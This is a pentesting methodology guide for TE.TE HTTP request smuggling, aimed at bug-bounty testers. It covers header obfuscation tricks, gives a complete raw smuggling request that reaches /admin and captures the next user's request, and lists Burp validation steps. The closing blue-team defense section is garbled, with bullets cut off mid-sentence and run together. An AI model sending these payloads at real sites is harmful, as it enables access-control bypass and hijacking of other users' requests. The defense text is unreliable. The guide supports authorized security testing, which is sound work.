# HTTP Request Smuggling (TE.TE)

## When to Use
- When auditing modern web architectures that utilize a reverse proxy, load balancer, or CDN (Frontend) sitting in front of the actual application server (Backend).
- When standard CL.TE or TE.CL request smuggling vectors fail because both servers support the `Transfer-Encoding: chunked` header.
- To achieve critical impact such as bypassing front-end IP restrictions, web application firewalls (WAF), or executing devastating web cache poisoning attacks.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding TE.TE Smuggling (The Concept)

```text
# Concept: Normally, HTTP requests are separated securely.
# In Request Smuggling, we send *one* mathematically ambiguous HTTP request that the Frontend 
# proxy interprets as a single request, but the Backend interprets as *two* requests.

# TE.TE (Transfer-Encoding / Transfer-Encoding) occurs when BOTH the Frontend and Backend 
# servers support the `Transfer-Encoding` header.

# The Attack: We send a request with TWO `Transfer-Encoding` headers, but we intentionally 
# obfuscate one of them. The goal is to make the Frontend process the request using `chunked` 
# encoding, but trick the Backend into ignoring it (falling back to `Content-Length`) or vice versa.
```

### Phase 2: Obfuscating the Transfer-Encoding Header

```http
# We must find an obfuscation technique that one server accepts but the other rejects.

# Method 1: Spacing
Transfer-Encoding: chunked
Transfer-Encoding : x

# Method 2: Invalid encoding name
Transfer-Encoding: xchunked

# Method 3: Line folding (historical, but sometimes effective)
Transfer-Encoding:
 chunked

# If the Frontend processes the first header (chunked) and the Backend processes the second (invalid/ignored),
# we effectively convert the attack into a standard TE.CL attack, achieving desynchronization.
```

### Phase 3: Crafting the TE.TE Payload

```http
# Objective: The Frontend sees 1 request. The Backend sees 2 requests.
# Below is the raw HTTP request. (Note: \r\n line endings are CRITICAL and must perfectly align).

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

# The Breakdown:
# 1. Frontend: Processes `Transfer-Encoding: chunked`. Reads the chunk sizes (5c and 0) and forwards the entire block as one request.
# 2. Backend: Ignores `Transfer-encoding: cow` (or prioritizes `Content-Length: 4`). 
#    It reads only the first 4 bytes of the body ("5c\r\n"). 
# 3. The Smuggle: The backend leaves the remaining data (`GPOST /admin...`) sitting in its TCP buffer.
# 4. The Impact: The NEXT legitimate user who sends a request will inadvertently have their request appended to our smuggled `GPOST /admin` request!
```

### Phase 4: Validating and Exploiting

```bash
# 1. Use Burp Suite's "HTTP Request Smuggler" extension to accurately test permutations automatically.
# 2. To manually verify, send the payload repeatedly using Burp Repeater (updating Content-Length).
# 3. Watch for anomalous responses to normal requests (e.g., getting a 403 Forbidden for a normal request because it got appended to the smuggled `/admin` path).
```

## 🔵 Blue Team Detection & Defense
- **HTTP/2**: Upgrade the frontend-to-backend infrastructure to securely utilize HTTP/2 end-to-end **Header Normalization**: Ensure your frontend Load Balancer (e.g., HAProxy, Nginx) is **Disable Backend Connection Persistence**: Configure Key Concepts
